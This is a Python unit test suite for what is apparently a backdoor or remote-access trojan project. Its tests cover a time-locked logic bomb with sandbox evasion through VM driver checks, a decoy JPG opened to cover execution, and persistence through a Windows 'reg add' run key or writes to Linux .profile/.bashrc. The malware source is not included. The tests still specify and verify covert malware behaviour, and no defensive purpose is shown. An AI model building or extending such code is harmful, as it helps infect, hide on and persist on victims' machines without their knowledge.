import unittest
from unittest.mock import MagicMock, patch, mock_open
import os
import sys
import base64
import json
import socket

# Import client and server modules
import src.module.client as client
import src.module.server as server

class TestBackdoor(unittest.TestCase):
    
    @patch('src.module.client.os')
    @patch('src.module.client.time')
    def test_logic_bomb_future_time(self, mock_time, mock_os):
        # 模擬時間鎖迴圈：第一次檢查未到目標時間，第二次檢查時時間抵達，跳出等待
        mock_time.time.side_effect = [1779340799, 1779340801]
        mock_os.path.exists.return_value = False
        self.assertTrue(client.logic_bomb())

    @patch('src.module.client.os')
    @patch('src.module.client.time')
    def test_logic_bomb_sandbox_detected(self, mock_time, mock_os):
        # Test sandbox evasion triggers when VM drivers are found
        mock_time.time.return_value = 1779340801
        # Mock os.path.exists to return True for driver files
        mock_os.path.exists.return_value = True
        self.assertFalse(client.logic_bomb())

    @patch('src.module.client.os')
    @patch('src.module.client.time')
    def test_logic_bomb_success(self, mock_time, mock_os):
        # Test logic bomb passes under normal, valid conditions
        mock_time.time.return_value = 1779340801
        mock_os.path.exists.return_value = False
        self.assertTrue(client.logic_bomb())

    def test_recv_all_fragmentation(self):
        # Mock a socket that returns fragmented packets (2 bytes, then 2 bytes)
        mock_socket = MagicMock()
        mock_socket.recv.side_effect = [b"AB", b"CD"]
        
        result = client.recv_all(mock_socket, 4)
        self.assertEqual(result, b"ABCD")
        self.assertEqual(mock_socket.recv.call_count, 2)

    def test_recv_all_closed_socket(self):
        # Mock socket closing prematurely
        mock_socket = MagicMock()
        mock_socket.recv.return_value = b""
        
        result = client.recv_all(mock_socket, 4)
        self.assertIsNone(result)

    @patch('src.module.client.open', new_callable=mock_open)
    @patch('src.module.client.subprocess.Popen')
    @patch('src.module.client.os.startfile')
    @patch('src.module.client.sys')
    def test_open_fake_jpg_windows(self, mock_sys, mock_startfile, mock_popen, mock_file):
        # Test JPG decoy execution on Windows
        mock_sys.platform = "win32"
        client.open_fake_jpg()
        
        # Verify file is written
        mock_file.assert_called_once()
        # Verify os.startfile is called on Windows
        mock_startfile.assert_called_once()
        mock_popen.assert_not_called()

    @patch('src.module.client.open', new_callable=mock_open)
    @patch('src.module.client.subprocess.Popen')
    @patch('src.module.client.sys')
    def test_open_fake_jpg_linux(self, mock_sys, mock_popen, mock_file):
        # Test JPG decoy execution on Linux
        mock_sys.platform = "linux"
        client.open_fake_jpg()
        
        # Verify file is written
        mock_file.assert_called_once()
        # Verify subprocess.Popen with xdg-open is called on Linux
        mock_popen.assert_called_once()
        # Ensure xdg-open is called
        self.assertEqual(mock_popen.call_args[0][0][0], "xdg-open")

    @patch('src.module.client.shutil.copyfile')
    @patch('src.module.client.subprocess.run')
    @patch('src.module.client.os.path.exists')
    @patch('src.module.client.sys')
    def test_persist_windows(self, mock_sys, mock_exists, mock_run, mock_copyfile):
        # Test persistence path on Windows
        mock_sys.platform = "win32"
        mock_exists.return_value = False
        
        client.persist()
        
        mock_copyfile.assert_called_once()
        mock_run.assert_called_once()
        self.assertIn("reg add", mock_run.call_args[0][0])

    @patch('src.module.client.shutil.copyfile')
    @patch('src.module.client.os.path.exists')
    @patch('src.module.client.os.makedirs')
    @patch('src.module.client.os.chmod')
    @patch('src.module.client.sys')
    @patch('src.module.client.open', new_callable=mock_open)
    def test_persist_linux(self, mock_file, mock_sys, mock_chmod, mock_makedirs, mock_exists, mock_copyfile):
        # Test persistence path on Linux
        mock_sys.platform = "linux"
        # Return False for srv binary file check, but True for shell startup profile existence
        mock_exists.side_effect = lambda path: True if ".profile" in path or ".bashrc" in path else False
        
        client.persist()
        
        mock_copyfile.assert_called_once()
        # Verify it tries to write to shell startup script (.profile or .bashrc)
        mock_file.assert_called()

if __name__ == '__main__':
    unittest.main()
